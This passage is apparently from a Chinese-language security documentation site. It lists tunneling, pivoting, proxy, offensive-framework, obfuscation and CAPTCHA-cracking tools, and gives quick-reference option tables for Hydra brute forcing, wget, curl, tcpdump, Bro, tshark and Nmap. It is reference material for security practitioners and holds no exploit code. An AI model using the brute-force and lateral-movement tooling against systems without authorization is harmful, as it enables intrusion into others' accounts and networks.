<li><a class="reference external" href="https://github.com/hwdsl2/setup-ipsec-vpn">ipsec</a></li>
<li><a class="reference external" href="https://github.com/Nyr/openvpn-install">openvpn</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>隧道 / 代理<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/inconshreveable/ngrok">ngrok</a></li>
<li><a class="reference external" href="https://github.com/knownsec/rtcp">rtcp</a></li>
<li><a class="reference external" href="https://github.com/SECFORCE/Tunna">Tunna</a></li>
<li><a class="reference external" href="https://github.com/ginuerzh/gost">gost</a> GO Simple Tunnel</li>
<li><a class="reference external" href="https://github.com/sensepost/reDuh">reDuh</a> Create a TCP circuit through validly formed HTTP requests</li>
<li><a class="reference external" href="https://github.com/sensepost/reGeorg">reGeorg</a> pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn</li>
<li><a class="reference external" href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a> Neo-reGeorg is a project that seeks to aggressively refactor reGeorg</li>
<li><a class="reference external" href="https://github.com/nccgroup/ABPTTS">ABPTTS</a> TCP tunneling over HTTP/HTTPS for web application servers</li>
<li><a class="reference external" href="https://github.com/fatedier/frp">frp</a> A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet</li>
<li><a class="reference external" href="https://github.com/ffay/lanproxy">lanproxy</a> 内网穿透工具</li>
<li><a class="reference external" href="https://github.com/sysdream/ligolo">ligolo</a> Reverse Tunneling made easy for pentesters</li>
<li><a class="reference external" href="https://github.com/idlefire/ew">EarthWorm</a> 是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</li>
<li><a class="reference external" href="https://github.com/SECFORCE/Tunna">Tunna</a>  is a set of tools which will wrap and tunnel any TCP communication over HTTP</li>
<li><a class="reference external" href="https://github.com/blackarrowsec/mssqlproxy">mssqlproxy</a> is a toolkit aimed to perform lateral movement in restricted environments through a compromised Microsoft SQL Server via socket reuse</li>
<li><a class="reference external" href="https://github.com/ehang-io/nps">nps</a> a lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal</li>
</ul>
</div>
<div class="section" id="id7">
<h4>代理链<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/NetchX/Netch">Netch</a> Support Socks5, Shadowsocks, ShadowsocksR, V2Ray, Trojan proxies. UDP NAT FullCone</li>
<li><a class="reference external" href="https://github.com/haad/proxychains">proxychains</a> a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy</li>
</ul>
</div>
<div class="section" id="id8">
<h4>资产管理<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Tencent/bk-cmdb">BlueKing CMDB</a> 面向资产及应用的企业级配置管理平台</li>
<li><a class="reference external" href="https://github.com/TophantTechnology/ARL">ARL</a> 资产侦察灯塔系统</li>
</ul>
</div>
<div class="section" id="id9">
<h4>合规<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/momosecurity/bombus">bombus</a> 合规审计平台</li>
</ul>
</div>
<div class="section" id="id10">
<h4>风控<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/threathunterX/nebula">nebula</a></li>
<li><a class="reference external" href="https://github.com/ysrc/Liudao">Liudao</a> “六道”实时业务风控系统</li>
<li><a class="reference external" href="https://github.com/momosecurity/aswan">aswan</a> 陌陌风控系统静态规则引擎</li>
</ul>
</div>
<div class="section" id="siem">
<h4>SIEM<a class="headerlink" href="#siem" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/apache/metron">metron</a></li>
<li><a class="reference external" href="https://github.com/mozilla/MozDef">MozDef</a></li>
</ul>
</div>
<div class="section" id="id11">
<h4>安全运维<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/HandsomeOne/Scout">Scout</a> URL 监控系统</li>
<li><a class="reference external" href="https://github.com/qunarcorp/open_dnsdb">OpenDnsdb</a> 基于Python的DNS管理系统</li>
</ul>
</div>
<div class="section" id="id12">
<h4>系统监控<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/netdata/netdata">netdata</a> Real-time performance monitoring</li>
<li><a class="reference external" href="https://github.com/iovisor/bcc">bcc</a> Tools for BPF-based Linux IO analysis, networking, monitoring, and more</li>
</ul>
</div>
<div class="section" id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/zh-cn/sysinternals">Windows Sysinternals</a></li>
</ul>
</div>
<div class="section" id="id13">
<h4>网络测试<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Shopify/toxiproxy">Toxiproxy</a> A TCP proxy to simulate network and system conditions for chaos and resiliency testing</li>
</ul>
</div>
<div class="section" id="id14">
<h4>红队模拟<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mitre/caldera">CALDERA</a> Scalable Automated Adversary Emulation Platform</li>
</ul>
</div>
</div>
<span id="document-tools/misc"></span><div class="section" id="id1">
<h3>其他<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>综合框架<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.metasploit.com/">metasploit</a></li>
<li><a class="reference external" href="http://w3af.org/">w3af</a></li>
<li><a class="reference external" href="https://github.com/NullArray/AutoSploit/">AutoSploit</a></li>
<li><a class="reference external" href="https://cirt.net/nikto2">Nikto</a></li>
<li><a class="reference external" href="https://my.oschina.net/u/995648/blog/114321">skipfish</a></li>
<li><a class="reference external" href="http://www.arachni-scanner.com/">Arachni</a></li>
<li><a class="reference external" href="http://www.freebuf.com/sectool/5427.html">ZAP</a></li>
<li><a class="reference external" href="https://portswigger.net/burp/">BrupSuite</a></li>
<li><a class="reference external" href="https://github.com/smicallef/spiderfoot">Spiderfoot</a></li>
<li><a class="reference external" href="https://github.com/az0ne/AZScanner">AZScanner</a></li>
<li><a class="reference external" href="https://github.com/jeffzh3ng/Fuxi-Scanner">Fuxi</a></li>
<li><a class="reference external" href="https://www.vegabird.com/vooki/">vooki</a></li>
<li><a class="reference external" href="https://github.com/MrSqar-Ye/BadMod">BadMod</a></li>
<li><a class="reference external" href="https://github.com/Manisso/fsociety">fsociety</a> Hacking Tools Pack</li>
<li><a class="reference external" href="https://github.com/pry0cc/axiom">axiom</a> A dynamic infrastructure toolkit for red teamers and bug bounty hunters</li>
</ul>
</div>
<div class="section" id="id3">
<h4>验证码<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/FSecureLABS/captcha22">CAPTCHA22</a> is a toolset for building, and training, CAPTCHA cracking models using neural networks.</li>
</ul>
</div>
<div class="section" id="webassembly">
<h4>WebAssembly<a class="headerlink" href="#webassembly" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/WebAssembly/wabt">wabt</a></li>
<li><a class="reference external" href="https://github.com/WebAssembly/binaryen">binaryen</a></li>
<li><a class="reference external" href="https://github.com/wwwg/wasmdec">wasmdec</a></li>
</ul>
</div>
<div class="section" id="id4">
<h4>混淆<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mindedsecurity/JStillery">JStillery</a></li>
<li><a class="reference external" href="https://github.com/javascript-obfuscator/javascript-obfuscator">javascript obfuscator</a></li>
<li><a class="reference external" href="https://github.com/CaledoniaProject/php-decoder">基于hook的php混淆解密</a></li>
<li><a class="reference external" href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke Obfuscation</a></li>
</ul>
</div>
<div class="section" id="proxy-pool">
<h4>Proxy Pool<a class="headerlink" href="#proxy-pool" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/jhao104/proxy_pool">proxy pool by jhao104</a></li>
<li><a class="reference external" href="https://github.com/Python3WebSpider/ProxyPool">Proxy Pool by Germey</a></li>
<li><a class="reference external" href="https://github.com/imWildCat/scylla">scylla</a></li>
</ul>
</div>
<div class="section" id="android">
<h4>Android<a class="headerlink" href="#android" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/WooyunDota/DroidSSLUnpinning">DroidSSLUnpinning</a> Android certificate pinning disable tools</li>
</ul>
</div>
<div class="section" id="id5">
<h4>其他<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ropnop/serverless_toolkit">Serverless Toolkit</a></li>
<li><a class="reference external" href="https://github.com/PortSwigger/hackability">Rendering Engine Probe</a></li>
<li><a class="reference external" href="http://www.httrack.com/">httrack</a></li>
<li><a class="reference external" href="https://curl.haxx.se/">curl</a></li>
<li><a class="reference external" href="https://github.com/trimstray/htrace.sh">htrace</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/">Microsoft Sysinternals Utilities</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-manual/index"></span><div class="section" id="id1">
<h2>手册速查<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-manual/brute"></span><div class="section" id="id1">
<h3>爆破工具<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="hydra">
<h4>Hydra<a class="headerlink" href="#hydra" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-R</span></code> 继续从上一次进度破解</li>
<li><code class="docutils literal notranslate"><span class="pre">-S</span></code> 使用SSL链接</li>
<li><code class="docutils literal notranslate"><span class="pre">-s&lt;PORT&gt;</span></code> 指定端口</li>
<li><code class="docutils literal notranslate"><span class="pre">-l&lt;LOGIN&gt;</span></code> 指定破解的用户</li>
<li><code class="docutils literal notranslate"><span class="pre">-L&lt;FILE&gt;</span></code> 指定用户名字典</li>
<li><code class="docutils literal notranslate"><span class="pre">-p&lt;PASS&gt;</span></code> 指定密码破解</li>
<li><code class="docutils literal notranslate"><span class="pre">-P&lt;FILE&gt;</span></code> 指定密码字典</li>
<li><code class="docutils literal notranslate"><span class="pre">-e&lt;ns&gt;</span></code> 可选选项，n：空密码试探，s：使用指定用户和密码试探</li>
<li><code class="docutils literal notranslate"><span class="pre">-C&lt;FILE&gt;</span></code> 使用冒号分割格式，例如&quot;user:pwd&quot;来代替-L/-P参数</li>
<li><code class="docutils literal notranslate"><span class="pre">-M&lt;FILE&gt;</span></code> 指定目标列表文件一行一条</li>
<li><code class="docutils literal notranslate"><span class="pre">-o&lt;FILE&gt;</span></code> 指定结果输出文件</li>
<li><code class="docutils literal notranslate"><span class="pre">-f</span></code> 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</li>
<li><code class="docutils literal notranslate"><span class="pre">-t&lt;TASKS&gt;</span></code> 同时运行的线程数，默认为16</li>
<li><code class="docutils literal notranslate"><span class="pre">-w&lt;TIME&gt;</span></code> 设置最大超时的时间，单位秒，默认是30s</li>
<li><code class="docutils literal notranslate"><span class="pre">-vV</span></code> 显示详细过程</li>
</ul>
</div>
</div>
<span id="document-manual/download"></span><div class="section" id="id1">
<h3>下载工具<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="wget">
<h4>wget<a class="headerlink" href="#wget" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>常用<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>普通下载 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">http://example.com/file.iso</span></code></li>
<li>指定保存文件名 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐output-document=myname.iso</span> <span class="pre">http://example.com/file.iso</span></code></li>
<li>保存到指定目录 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐directory-prefix=folder/subfolder</span> <span class="pre">http://example.com/file.iso</span></code></li>
<li>大文件断点续传 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐continue</span> <span class="pre">http://example.com/big.file.iso</span></code></li>
<li>下载指定文件中的url列表 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐input</span> <span class="pre">list-of-file-urls.txt</span></code></li>
<li>下载指定数字列表的多个文件 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">http://example.com/images/{1..20}.jpg</span></code></li>
<li>下载web页面的所有资源 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐page-requisites</span> <span class="pre">‐‐span-hosts</span> <span class="pre">‐‐convert-links</span> <span class="pre">‐‐adjust-extension</span> <span class="pre">http://example.com/dir/file</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h5>整站下载<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>下载所有链接的页面和文件 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐execute</span> <span class="pre">robots=off</span> <span class="pre">‐‐recursive</span> <span class="pre">‐‐no-parent</span> <span class="pre">‐‐continue</span> <span class="pre">‐‐no-clobber</span> <span class="pre">http://example.com/</span></code></li>
<li>下载指定后缀的文件 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐level=1</span> <span class="pre">‐‐recursive</span> <span class="pre">‐‐no-parent</span> <span class="pre">‐‐accept</span> <span class="pre">mp3,MP3</span> <span class="pre">http://example.com/mp3/</span></code></li>
<li>排除指定目录下载 <code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">‐‐recursive</span> <span class="pre">‐‐no-clobber</span> <span class="pre">‐‐no-parent</span> <span class="pre">‐‐exclude-directories</span> <span class="pre">/forums,/support</span> <span class="pre">http://example.com</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h5>指定参数<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>user agent <code class="docutils literal notranslate"><span class="pre">‐‐user-agent=&quot;Mozilla/5.0</span> <span class="pre">Firefox/4.0.1&quot;</span></code></li>
<li>basic auth <code class="docutils literal notranslate"><span class="pre">‐‐http-user=user</span> <span class="pre">‐‐http-password=pwd</span></code></li>
<li>保存cookie <code class="docutils literal notranslate"><span class="pre">‐‐cookies=on</span> <span class="pre">‐‐save-cookies</span> <span class="pre">cookies.txt</span> <span class="pre">‐‐keep-session-cookies</span></code></li>
<li>使用cookie <code class="docutils literal notranslate"><span class="pre">‐‐cookies=on</span> <span class="pre">‐‐load-cookies</span> <span class="pre">cookies.txt</span> <span class="pre">‐‐keep-session-cookies</span></code></li>
</ul>
</div>
</div>
<div class="section" id="curl">
<h4>curl<a class="headerlink" href="#curl" title="永久链接至标题">¶</a></h4>
<div class="section" id="id5">
<h5>常用<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>直接显示 <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">www.example.com</span></code></li>
<li>保存指定的名字 <code class="docutils literal notranslate"><span class="pre">-o</span> <span class="pre">newname</span></code></li>
<li>不指定名字 <code class="docutils literal notranslate"><span class="pre">-O</span></code></li>
</ul>
</div>
<div class="section" id="id6">
<h5>正则<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>文件名 <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">ftp://example.com/file[1-100].txt</span></code></li>
<li>域名 <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">http://site.{one,two,three}.com</span></code></li>
</ul>
</div>
</div>
</div>
<span id="document-manual/traffic"></span><div class="section" id="id1">
<h3>流量相关<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="tcpdump">
<h4>TCPDump<a class="headerlink" href="#tcpdump" title="永久链接至标题">¶</a></h4>
<p>TCPDump是一款数据包的抓取分析工具，可以将网络中传送的数据包的完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供逻辑语句来过滤包。</p>
<div class="section" id="id2">
<h5>命令行常用选项<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-B</span> <span class="pre">&lt;buffer_size&gt;</span></code> 抓取流量的缓冲区大小，若过小则可能丢包，单位为KB</li>
<li><code class="docutils literal notranslate"><span class="pre">-c</span> <span class="pre">&lt;count&gt;</span></code> 抓取n个包后退出</li>
<li><code class="docutils literal notranslate"><span class="pre">-C</span> <span class="pre">&lt;file_size&gt;</span></code> 当前记录的包超过一定大小后，另起一个文件记录，单位为MB</li>
<li><code class="docutils literal notranslate"><span class="pre">-i</span> <span class="pre">&lt;interface&gt;</span></code> 指定抓取网卡经过的流量</li>
<li><code class="docutils literal notranslate"><span class="pre">-n</span></code> 不转换地址</li>
<li><code class="docutils literal notranslate"><span class="pre">-r</span> <span class="pre">&lt;file&gt;</span></code> 读取保存的pcap文件</li>
<li><code class="docutils literal notranslate"><span class="pre">-s</span> <span class="pre">&lt;snaplen&gt;</span></code> 从每个报文中截取snaplen字节的数据，0为所有数据</li>
<li><code class="docutils literal notranslate"><span class="pre">-q</span></code> 输出简略的协议相关信息，输出行都比较简短。</li>
<li><code class="docutils literal notranslate"><span class="pre">-W</span> <span class="pre">&lt;cnt&gt;</span></code> 写满cnt个文件后就不再写入</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">-w</span> <span class="pre">&lt;file&gt;</span></code> 保存流量至文件</dt>
<dd><ul class="first last">
<li>按时间分包时，可使用strftime的格式命名，例如 <code class="docutils literal notranslate"><span class="pre">%Y_%m_%d_%H_%M_%S.pcap</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><code class="docutils literal notranslate"><span class="pre">-G</span> <span class="pre">&lt;seconds&gt;</span></code> 按时间分包</li>
<li><code class="docutils literal notranslate"><span class="pre">-v</span></code> 产生详细的输出，<code class="docutils literal notranslate"><span class="pre">-vv</span></code> <code class="docutils literal notranslate"><span class="pre">-vvv</span></code> 会产生更详细的输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-X</span></code> 输出报文头和包的内容</li>
<li><code class="docutils literal notranslate"><span class="pre">-Z</span> <span class="pre">&lt;user&gt;</span></code> 在写文件之前，转换用户</li>
</ul>
</div>
</div>
<div class="section" id="bro">
<h4>Bro<a class="headerlink" href="#bro" title="永久链接至标题">¶</a></h4>
<p>Bro是一个开源的网络流量分析工具，支持多种协议，可实时或者离线分析流量。</p>
<div class="section" id="id3">
<h5>命令行<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>实时监控 <code class="docutils literal notranslate"><span class="pre">bro</span> <span class="pre">-i</span> <span class="pre">&lt;interface&gt;</span> <span class="pre">&lt;list</span> <span class="pre">of</span> <span class="pre">script</span> <span class="pre">to</span> <span class="pre">load&gt;</span></code></li>
<li>分析本地流量 <code class="docutils literal notranslate"><span class="pre">bro</span> <span class="pre">-r</span> <span class="pre">&lt;pcapfile&gt;</span> <span class="pre">&lt;scripts...&gt;</span></code></li>
<li>分割解析流量后的日志 <code class="docutils literal notranslate"><span class="pre">bro-cut</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h5>脚本<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>为了能够扩展和定制Bro的功能，Bro提供了一个事件驱动的脚本语言。</p>
</div>
</div>
<div class="section" id="tcpflow">
<h4>tcpflow<a class="headerlink" href="#tcpflow" title="永久链接至标题">¶</a></h4>
<p>tcpflow也是一个抓包工具，它的特点是以流为单位显示数据内容，在分析HTTP等协议的数据时候，用tcpflow会更便捷。</p>
<div class="section" id="id5">
<h5>命令行常用选项<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-b</span> <span class="pre">max_bytes</span></code> 定义最大抓取流量</li>
<li><code class="docutils literal notranslate"><span class="pre">-e</span> <span class="pre">name</span></code> 指定解析的scanner</li>
<li><code class="docutils literal notranslate"><span class="pre">-i</span> <span class="pre">interface</span></code> 指定抓取接口</li>
<li><code class="docutils literal notranslate"><span class="pre">-o</span> <span class="pre">outputdir</span></code> 指定输出文件夹</li>
<li><code class="docutils literal notranslate"><span class="pre">-r</span> <span class="pre">file</span></code> 读取文件</li>
<li><code class="docutils literal notranslate"><span class="pre">-R</span> <span class="pre">file</span></code> 读取文件，但是只读取完整的文件</li>
</ul>
</div>
</div>
<div class="section" id="tshark">
<h4>tshark<a class="headerlink" href="#tshark" title="永久链接至标题">¶</a></h4>
<p>WireShark的命令行工具，可以通过命令提取自己想要的数据，可以重定向到文件，也可以结合上层语言来调用命令行，实现对数据的处理。</p>
<div class="section" id="id6">
<h5>输入接口<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-i</span> <span class="pre">&lt;interface&gt;</span></code> 指定捕获接口，默认是第一个非本地循环接口</li>
<li><code class="docutils literal notranslate"><span class="pre">-f</span> <span class="pre">&lt;capture</span> <span class="pre">filter&gt;</span></code> 设置抓包过滤表达式，遵循libpcap过滤语法，这个选项在抓包的过程中过滤，如果是分析本地文件则用不到</li>
<li><code class="docutils literal notranslate"><span class="pre">-s</span> <span class="pre">&lt;snaplen&gt;</span></code> 设置快照长度，用来读取完整的数据包，因为网络中传输有65535的限制，值0代表快照长度65535，默认为65535</li>
<li><code class="docutils literal notranslate"><span class="pre">-p</span></code> 以非混合模式工作，即只关心和本机有关的流量</li>
<li><code class="docutils literal notranslate"><span class="pre">-B</span> <span class="pre">&lt;buffer</span> <span class="pre">size&gt;</span></code> 设置缓冲区的大小，只对windows生效，默认是2M</li>
<li><code class="docutils literal notranslate"><span class="pre">-y</span> <span class="pre">&lt;link</span> <span class="pre">type&gt;</span></code> 设置抓包的数据链路层协议，不设置则默认为 <code class="docutils literal notranslate"><span class="pre">-L</span></code> 找到的第一个协议</li>
<li><code class="docutils literal notranslate"><span class="pre">-D</span></code> 打印接口的列表并退出</li>
<li><code class="docutils literal notranslate"><span class="pre">-L</span></code> 列出本机支持的数据链路层协议，供-y参数使用。</li>
<li><code class="docutils literal notranslate"><span class="pre">-r</span> <span class="pre">&lt;infile&gt;</span></code> 设置读取本地文件</li>
</ul>
</div>
<div class="section" id="id7">
<h5>捕获停止选项<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-c</span> <span class="pre">&lt;packet</span> <span class="pre">count&gt;</span></code> 捕获n个包之后结束，默认捕获无限个</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">-a</span> <span class="pre">&lt;autostop</span> <span class="pre">cond&gt;</span></code></dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">duration:NUM</span></code> 在num秒之后停止捕获</li>
<li><code class="docutils literal notranslate"><span class="pre">filesize:NUM</span></code> 在numKB之后停止捕获</li>
<li><code class="docutils literal notranslate"><span class="pre">files:NUM</span></code> 在捕获num个文件之后停止捕获</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h5>处理选项<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-Y</span> <span class="pre">&lt;display</span> <span class="pre">filter&gt;</span></code> 使用读取过滤器的语法，在单次分析中可以代替 <code class="docutils literal notranslate"><span class="pre">-R</span></code> 选项</li>
<li><code class="docutils literal notranslate"><span class="pre">-n</span></code> 禁止所有地址名字解析（默认为允许所有）</li>
<li><code class="docutils literal notranslate"><span class="pre">-N</span></code> 启用某一层的地址名字解析。 <code class="docutils literal notranslate"><span class="pre">m</span></code> 代表MAC层， <code class="docutils literal notranslate"><span class="pre">n</span></code> 代表网络层， <code class="docutils literal notranslate"><span class="pre">t</span></code> 代表传输层， <code class="docutils literal notranslate"><span class="pre">C</span></code> 代表当前异步DNS查找。如果 <code class="docutils literal notranslate"><span class="pre">-n</span></code> 和 <code class="docutils literal notranslate"><span class="pre">-N</span></code> 参数同时存在， <code class="docutils literal notranslate"><span class="pre">-n</span></code> 将被忽略。如果 <code class="docutils literal notranslate"><span class="pre">-n</span></code> 和 <code class="docutils literal notranslate"><span class="pre">-N</span></code> 参数都不写，则默认打开所有地址名字解析。</li>
<li><code class="docutils literal notranslate"><span class="pre">-d</span></code> 将指定的数据按有关协议解包输出，如要将tcp 8888端口的流量按http解包，应该写为 <code class="docutils literal notranslate"><span class="pre">-d</span> <span class="pre">tcp.port==8888,http</span></code> 。可用 <code class="docutils literal notranslate"><span class="pre">tshark</span> <span class="pre">-d</span></code> 列出所有支持的有效选择器。</li>
</ul>
</div>
<div class="section" id="id9">
<h5>输出选项<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-w</span> <span class="pre">&lt;outfile&gt;</span></code> 设置raw数据的输出文件。不设置时为stdout</li>
<li><code class="docutils literal notranslate"><span class="pre">-F</span> <span class="pre">&lt;output</span> <span class="pre">file</span> <span class="pre">type&gt;</span></code> 设置输出的文件格式，默认是 <code class="docutils literal notranslate"><span class="pre">.pcapng</span></code>，使用 <code class="docutils literal notranslate"><span class="pre">tshark</span> <span class="pre">-F</span></code> 可列出所有支持的输出文件类型</li>
<li><code class="docutils literal notranslate"><span class="pre">-V</span></code> 增加细节输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-O</span> <span class="pre">&lt;protocols&gt;</span></code> 只显示此选项指定的协议的详细信息</li>
<li><code class="docutils literal notranslate"><span class="pre">-P</span></code> 即使将解码结果写入文件中，也打印包的概要信息</li>
<li><code class="docutils literal notranslate"><span class="pre">-S</span> <span class="pre">&lt;separator&gt;</span></code> 行分割符</li>
<li><code class="docutils literal notranslate"><span class="pre">-x</span></code> 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据</li>
<li><code class="docutils literal notranslate"><span class="pre">-T</span> <span class="pre">pdml|ps|text|fields|psml</span></code> 设置解码结果输出的格式，默认为text</li>
<li><code class="docutils literal notranslate"><span class="pre">-e</span></code> 如果 <code class="docutils literal notranslate"><span class="pre">-T</span></code> 选项指定， <code class="docutils literal notranslate"><span class="pre">-e</span></code> 用来指定输出哪些字段</li>
<li><code class="docutils literal notranslate"><span class="pre">-t</span> <span class="pre">a|ad|d|dd|e|r|u|ud</span></code> 设置解码结果的时间格式</li>
<li><code class="docutils literal notranslate"><span class="pre">-u</span> <span class="pre">s|hms</span></code> 格式化输出秒</li>
<li><code class="docutils literal notranslate"><span class="pre">-l</span></code> 在输出每个包之后flush标准输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-q</span></code> 结合 <code class="docutils literal notranslate"><span class="pre">-z</span></code> 选项进行使用，来进行统计分析</li>
<li><code class="docutils literal notranslate"><span class="pre">-X</span> <span class="pre">&lt;key&gt;:&lt;value&gt;</span></code> 扩展项，lua_script、read_format</li>
<li><code class="docutils literal notranslate"><span class="pre">-z</span></code> 统计选项，具体的参考文档</li>
</ul>
</div>
<div class="section" id="id10">
<h5>其他选项<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-h</span></code> 显示命令行帮助</li>
<li><code class="docutils literal notranslate"><span class="pre">-v</span></code> 显示tshark的版本信息</li>
</ul>
</div>
</div>
</div>
<span id="document-manual/sniffing"></span><div class="section" id="id1">
<h3>嗅探工具<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="nmap">
<h4>Nmap<a class="headerlink" href="#nmap" title="永久链接至标题">¶</a></h4>
<p><code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">[&lt;扫描类型&gt;...]</span> <span class="pre">[&lt;选项&gt;]</span> <span class="pre">{&lt;扫描目标说明&gt;}</span></code></p>
<div class="section" id="id2">
<h5>指定目标<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CIDR风格 <code class="docutils literal notranslate"><span class="pre">192.168.1.0/24</span></code></li>
<li>逗号分割 <code class="docutils literal notranslate"><span class="pre">www.baidu.com,www.zhihu.com</span></code></li>
<li>分割线 <code class="docutils literal notranslate"><span class="pre">10.22-25.43.32</span></code></li>
<li>来自文件 <code class="docutils literal notranslate"><span class="pre">-iL</span> <span class="pre">&lt;inputfile&gt;</span></code></li>
<li>排除不需要的host <code class="docutils literal notranslate"><span class="pre">--exclude</span> <span class="pre">&lt;host1</span> <span class="pre">[,</span> <span class="pre">host2]</span> <span class="pre">[,</span> <span class="pre">host3]</span> <span class="pre">...</span> <span class="pre">&gt;</span></code> <code class="docutils literal notranslate"><span class="pre">--excludefile</span> <span class="pre">&lt;excludefile&gt;</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h5>主机发现<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-sL</span></code> List Scan - simply list targets to scan</li>
